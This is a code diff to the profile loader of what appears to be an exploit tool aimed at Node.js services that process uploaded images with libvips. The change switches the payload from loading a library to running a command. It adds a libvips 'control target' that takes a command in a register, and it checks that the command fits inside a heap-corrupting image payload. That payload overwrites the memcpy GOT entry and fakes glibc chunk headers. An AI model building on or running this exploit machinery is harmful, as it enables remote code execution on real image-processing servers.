@@ -13,7 +13,7 @@ from urllib.parse import urlsplit
 
 HERE = Path(__file__).resolve().parent
 DEFAULT_MANIFEST = HERE / "profiles" / "native_stack_profiles.json"
-SUPPORTED_SCHEMA = 3
+SUPPORTED_SCHEMA = 4
 MAX_LEAK_SCAN_BYTES = 16 * 1024 * 1024
 _HEX_RE = re.compile(r"^[0-9a-f]+$")
 _FILENAME_RE = re.compile(r"^[A-Za-z0-9._-]+$")
@@ -34,12 +34,13 @@ class ApplicationProfile:
     upload_endpoint: str
     optimize_endpoint: str
     upload_directory: str
-    library_name: str
-    max_library_path_bytes: int
+    script_name: str
+    command_executable: str
+    max_command_bytes: int
 
     @property
-    def library_path(self) -> str:
-        return f"{self.upload_directory}/{self.library_name}"
+    def script_path(self) -> str:
+        return f"{self.upload_directory}/{self.script_name}"
 
 
 @dataclass(frozen=True)
@@ -49,9 +50,15 @@ class NodeProfile:
     filename: str
     build_id: str
     sha256: str
-    unix_dl_open_symbol: str
-    unix_dl_open_address: int
-    unix_dl_open_bytes: bytes
+
+
+@dataclass(frozen=True)
+class ControlTargetProfile:
+    module: str
+    symbol: str
+    offset: int
+    abi: str
+    bytes: bytes
 
 
 @dataclass(frozen=True)
@@ -91,6 +98,7 @@ class LibvipsProfile:
     memcpy_symbol: str
     memcpy_got_offset: int
     memcpy_relocation: str
+    control_target: ControlTargetProfile
     leak: LeakProfile
 
 
@@ -168,7 +176,7 @@ class PayloadProfile:
     grid_columns: int
     canvas_stride: int
     fake_node_local_row: int
-    path_field_bytes: int
+    command_field_bytes: int
     write_target_backoff: int
     preserved_prefix_bytes: int
     chunk_header_offset: int
@@ -302,7 +310,7 @@ def _application(value: Any, path: str) -> ApplicationProfile:
     data = _mapping(value, path)
     _exact_keys(data, path, {
         "upload_endpoint", "optimize_endpoint", "upload_directory",
-        "library_name", "max_library_path_bytes",
+        "script_name", "command_executable", "max_command_bytes",
     })
     result = ApplicationProfile(
         upload_endpoint=_string(data["upload_endpoint"], f"{path}.upload_endpoint"),
@@ -311,11 +319,14 @@ def _application(value: Any, path: str) -> ApplicationProfile:
         ),
         upload_directory=_string(
             data["upload_directory"], f"{path}.upload_directory",
-        ).strip("/"),
-        library_name=_string(data["library_name"], f"{path}.library_name"),
-        max_library_path_bytes=_integer(
-            data["max_library_path_bytes"],
-            f"{path}.max_library_path_bytes",
+        ),
+        script_name=_string(data["script_name"], f"{path}.script_name"),
+        command_executable=_string(
+            data["command_executable"], f"{path}.command_executable",
+        ),
+        max_command_bytes=_integer(
+            data["max_command_bytes"],
+            f"{path}.max_command_bytes",
             positive=True,
         ),
     )
@@ -335,20 +346,39 @@ def _application(value: Any, path: str) -> ApplicationProfile:
             raise ProfileError(f"{path}.{field_name} must be one absolute URL path")
     if not result.upload_directory:
         raise ProfileError(f"{path}.upload_directory must not be empty")
+    directory = PurePosixPath(result.upload_directory)
     if (
-        not _FILENAME_RE.fullmatch(result.library_name)
-        or result.library_name in {".", ".."}
+        directory.is_absolute()
+        or ".." in directory.parts
+        or any(
+            not _FILENAME_RE.fullmatch(component)
+            or component in {".", ".."}
+            for component in directory.parts
+        )
     ):
-        raise ProfileError(f"{path}.library_name must be one safe path component")
-    remote_path = PurePosixPath(result.library_path)
+        raise ProfileError(f"{path}.upload_directory must be a safe relative path")
+    if (
+        not _FILENAME_RE.fullmatch(result.script_name)
+        or result.script_name in {".", ".."}
+    ):
+        raise ProfileError(f"{path}.script_name must be one safe path component")
+    if (
+        not _FILENAME_RE.fullmatch(result.command_executable)
+        or result.command_executable in {".", ".."}
+    ):
+        raise ProfileError(
+            f"{path}.command_executable must be one safe command name",
+        )
+    remote_path = PurePosixPath(result.script_path)
     if remote_path.is_absolute() or ".." in remote_path.parts:
-        raise ProfileError(f"{path} contains an unsafe library path")
+        raise ProfileError(f"{path} contains an unsafe script path")
     try:
-        encoded_length = len(result.library_path.encode("ascii")) + 1
+        command = f"{result.command_executable} {result.script_path}"
+        encoded_length = len(command.encode("ascii")) + 1
     except UnicodeEncodeError as error:
-        raise ProfileError(f"{path} library path must be ASCII") from error
-    if encoded_length > result.max_library_path_bytes:
-        raise ProfileError(f"{path} default library path exceeds its maximum")
+        raise ProfileError(f"{path} payload command must be ASCII") from error
+    if encoded_length > result.max_command_bytes:
+        raise ProfileError(f"{path} default payload command exceeds its maximum")
     return result
 
 
@@ -356,33 +386,16 @@ def _node(value: Any, path: str) -> NodeProfile:
     data = _mapping(value, path)
     _exact_keys(data, path, {
         "version", "elf_type", "filename", "build_id", "sha256",
-        "unix_dl_open",
-    })
-    helper = _mapping(data["unix_dl_open"], f"{path}.unix_dl_open")
-    _exact_keys(helper, f"{path}.unix_dl_open", {
-        "symbol", "address", "bytes",
     })
     elf_type = _string(data["elf_type"], f"{path}.elf_type")
-    if elf_type != "ET_EXEC":
-        raise ProfileError(
-            f"{path}.elf_type must be ET_EXEC because this profile has no "
-            "Node PIE base-disclosure primitive",
-        )
+    if elf_type not in {"ET_EXEC", "ET_DYN"}:
+        raise ProfileError(f"{path}.elf_type must be ET_EXEC or ET_DYN")
     return NodeProfile(
         version=_string(data["version"], f"{path}.version"),
         elf_type=elf_type,
         filename=_string(data["filename"], f"{path}.filename"),
         build_id=_hex_digest(data["build_id"], f"{path}.build_id"),
         sha256=_hex_digest(data["sha256"], f"{path}.sha256", 64),
-        unix_dl_open_symbol=_string(
-            helper["symbol"], f"{path}.unix_dl_open.symbol",
-        ),
-        unix_dl_open_address=_integer(
-            helper["address"], f"{path}.unix_dl_open.address", positive=True,
-        ),
-        unix_dl_open_bytes=_signature(
-            helper["bytes"], f"{path}.unix_dl_open.bytes",
-        ),
     )
 
 
@@ -391,12 +404,24 @@ def _libvips(value: Any, path: str) -> LibvipsProfile:
     _exact_keys(data, path, {
         "version", "package", "package_version", "filename", "build_id",
         "sha256", "package_manifest_sha256", "versions_manifest_sha256",
-        "memcpy_got", "leak",
+        "memcpy_got", "control_target", "leak",
     })
     got = _mapping(data["memcpy_got"], f"{path}.memcpy_got")
     _exact_keys(got, f"{path}.memcpy_got", {
         "symbol", "offset", "relocation",
     })
+    control = _mapping(data["control_target"], f"{path}.control_target")
+    _exact_keys(control, f"{path}.control_target", {
+        "module", "symbol", "offset", "abi", "bytes",
+    })
+    module = _string(control["module"], f"{path}.control_target.module")
+    if module != "libvips":
+        raise ProfileError(f"{path}.control_target.module must be libvips")
+    abi = _string(control["abi"], f"{path}.control_target.abi")
+    if abi != "command_rdi_error_rsi":
+        raise ProfileError(
+            f"{path}.control_target.abi must be command_rdi_error_rsi",
+        )
     leak = _mapping(data["leak"], f"{path}.leak")
     _exact_keys(leak, f"{path}.leak", {
         "anchors", "required_anchors", "scan_start", "scan_end",
@@ -491,6 +516,21 @@ def _libvips(value: Any, path: str) -> LibvipsProfile:
         ),
         memcpy_relocation=_string(
             got["relocation"], f"{path}.memcpy_got.relocation",
+        ),
+        control_target=ControlTargetProfile(
+            module=module,
+            symbol=_string(
+                control["symbol"], f"{path}.control_target.symbol",
+            ),
+            offset=_integer(
+                control["offset"],
+                f"{path}.control_target.offset",
+                positive=True,
+            ),
+            abi=abi,
+            bytes=_signature(
+                control["bytes"], f"{path}.control_target.bytes",
+            ),
         ),
         leak=LeakProfile(
             anchors=tuple(anchors),
@@ -683,7 +723,7 @@ def _payload(value: Any, path: str) -> PayloadProfile:
     keys = {
         "tile_width", "tile_height", "grid_rows", "grid_columns",
         "canvas_stride", "fake_node_local_row",
-        "path_field_bytes", "write_target_backoff", "preserved_prefix_bytes",
+        "command_field_bytes", "write_target_backoff", "preserved_prefix_bytes",
         "chunk_header_offset", "chunk_header_size", "redirect_pointer_offset",
         "redirect_pointer_size",
     }
@@ -698,12 +738,12 @@ def _payload(value: Any, path: str) -> PayloadProfile:
         raise ProfileError(f"{path}.chunk_header_size must be 16")
     if result.redirect_pointer_size != 2:
         raise ProfileError(f"{path}.redirect_pointer_size must be two")
-    if result.path_field_bytes + 8 > result.chroma_width:
-        raise ProfileError(f"{path} loader row exceeds the chroma width")
+    if result.command_field_bytes + 8 > result.chroma_width:
+        raise ProfileError(f"{path} control-target row exceeds the chroma width")
     if result.canvas_stride < result.chroma_width:
         raise ProfileError(f"{path}.canvas_stride is shorter than a chroma row")
-    if result.write_target_backoff != result.path_field_bytes:
-        raise ProfileError(f"{path} GOT backoff must equal the path field")
+    if result.write_target_backoff != result.command_field_bytes:
+        raise ProfileError(f"{path} GOT backoff must equal the command field")
     if result.chunk_header_offset != result.preserved_prefix_bytes:
         raise ProfileError(f"{path} chunk header must follow the preserved prefix")
     if result.chunk_header_offset + result.chunk_header_size > result.chroma_width:
@@ -746,8 +786,8 @@ def _profile(profile_id: str, value: Any) -> NativeStackProfile:
         ),
         payload=_payload(data["payload"], f"{path}.payload"),
     )
-    if result.application.max_library_path_bytes > result.payload.path_field_bytes:
-        raise ProfileError(f"{path} application path exceeds payload capacity")
+    if result.application.max_command_bytes > result.payload.command_field_bytes:
+        raise ProfileError(f"{path} application command exceeds payload capacity")
     if result.glibc.root_chunk_size_and_flags > 0xFFFFFFFFFFFFFFFF:
         raise ProfileError(f"{path}.glibc root chunk field exceeds eight bytes")
     return result
